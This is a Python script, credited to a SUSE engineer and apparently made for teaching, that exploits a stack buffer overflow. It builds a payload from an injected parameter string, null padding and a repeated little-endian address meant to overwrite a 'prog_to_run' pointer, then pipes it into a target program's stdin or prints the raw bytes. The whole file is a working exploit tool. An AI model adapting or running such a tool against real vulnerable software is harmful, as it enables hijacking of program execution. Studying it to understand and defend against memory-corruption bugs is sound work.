#!/usr/bin/python3

# Matthias Gerstner
# SUSE Linux GmbH
# matthias.gerstner@suse.com

import argparse
import os
import subprocess
import sys


def hex_int(val):
    return int(val, 16)


parser = argparse.ArgumentParser(
    description="Tries to exploit a stack overflow by replacing a stack parameter."
)

parser.add_argument(
    "-p", "--program",
    help="The program to exploit. This needs to accept input on stdin that will lead to an overflow",
    default="run_safe_prog"
)

parser.add_argument(
    "-n", "--param",
    help="New parameter to inject",
    required=True
)

parser.add_argument(
    "-a", "--address",
    help="The string address to use for overflowing",
    required=True,
    type=hex_int,
)

parser.add_argument(
    "-c", "--count",
    help="Number of times to feed to the desired parameter address to the exploitable program's stdin after the new parameter to inject",
    default=8,
    type=int
)

parser.add_argument(
    "-o", "--output",
    help="Instead of directly running the program just output the exploit buffer content",
    default=False,
    action='store_true'
)

args = parser.parse_args()

prog = args.program

if not os.path.isabs(prog):
    prog = os.path.join(os.getcwd(), prog)


if not os.path.exists(prog):
    print("Couldn't find program to exploit in", prog)
    sys.exit(1)

overflow_data = args.param + '\0'
padding_bytes = 8 - (len(overflow_data) % 8)
# make sure we add the string address on a pointer aligned boundary
for pb in range(padding_bytes):
    overflow_data += '\0'

overflow_data = overflow_data.encode()
addr_bin = args.address.to_bytes(8, byteorder='little', signed=False)

# append the desired amount of string addresses, hoping we will overflow the
# "prog_to_run" pointer correctly
for count in range(args.count):
    overflow_data += addr_bin

if args.output:

    if os.isatty(sys.stdout.fileno()):
        for bt in overflow_data:
            print("\\x" + format(bt, '02x'), end='')

        print()
    else:
        os.write(sys.stdout.fileno(), overflow_data)
    sys.exit(0)

process = subprocess.Popen(
    [prog], stdin=subprocess.PIPE
)

process.stdin.write(overflow_data)

process.stdin.close()

res = process.wait()
if res >= 0:
    print("Program exited with", res)
else:
    print("Program terminated with signal", -res)
